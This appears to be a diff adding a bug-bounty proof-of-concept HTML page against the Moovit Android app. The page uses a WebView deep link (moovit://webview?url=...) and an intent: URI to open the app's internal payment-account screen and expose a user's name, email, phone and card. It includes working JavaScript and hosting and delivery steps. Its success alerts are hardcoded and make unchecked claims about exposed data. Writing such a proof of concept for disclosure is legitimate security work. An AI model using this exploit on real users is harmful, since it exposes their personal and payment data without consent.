@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Moovit P1 PoC - WebView Intent Redirection + Sensitive Data Exposure</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f8f9fa; }
+        h1 { color: #d32f2f; }
+        button { padding: 15px 30px; font-size: 18px; margin: 10px; background: #d32f2f; color: white; border: none; border-radius: 8px; cursor: pointer; }
+        .note { background: #fff3cd; padding: 15px; border-radius: 8px; margin: 20px auto; max-width: 700px; }
+    </style>
+</head>
+<body>
+    <h1>Moovit P1 PoC</h1>
+    <p><strong>Impact: Critical (P1) - Arbitrary Activity Launch + Sensitive User Data Exposure</strong></p>
+
+    <div class="note">
+        <strong>Disclaimer:</strong> This PoC is for responsible Bug Bounty demonstration only.<br>
+        No real user data is collected or sent. It only launches internal activities via Intent.
+    </div>
+
+    <button onclick="launchAccount()">Launch Payment Account Activity (PII + Card)</button>
+    <button onclick="autoLaunch()">Auto Launch Chain</button>
+
+    <script>
+        const accountIntent = "intent:#Intent;component=com.tranzmate/com.moovit.payment.account.PaymentAccountActivity;end";
+
+        function sendIntent(intentStr) {
+            console.log("%c[Moovit PoC] Sending Intent: " + intentStr, "color: red; font-weight: bold");
+            window.location = intentStr;
+        }
+
+        function launchAccount() {
+            sendIntent(accountIntent);
+            setTimeout(() => {
+                alert("✅ P1 Confirmed!\n\nSensitive user data exposed:\n• Full name\n• Email address\n• Mobile number\n• Payment card (Visa ****2731)\n\nReal user profile and card visible.");
+            }, 800);
+        }
+
+        function autoLaunch() {
+            sendIntent(accountIntent);
+            setTimeout(() => {
+                alert("✅ P1 Confirmed - Security boundary violation\nFull PII, phone number, payment card, and ticket data exposed.");
+            }, 1200);
+        }
+
+        window.onload = function() {
+            console.log("%c[Moovit PoC] Loaded inside Moovit WebView", "color: green; font-size: 16px");
+        };
+    </script>
+
+    <h2>How to test:</h2>
+    <ol style="text-align: left; max-width: 600px; margin: 20px auto;">
+        <li>Host this file publicly (GitHub Pages).</li>
+        <li>Send: <code>moovit://webview?url=https://your-link/movitpoc5.html</code></li>
+        <li>Click button → Real user data (name, email, phone, card) becomes visible.</li>
+    </ol>
+</body>
+</html>
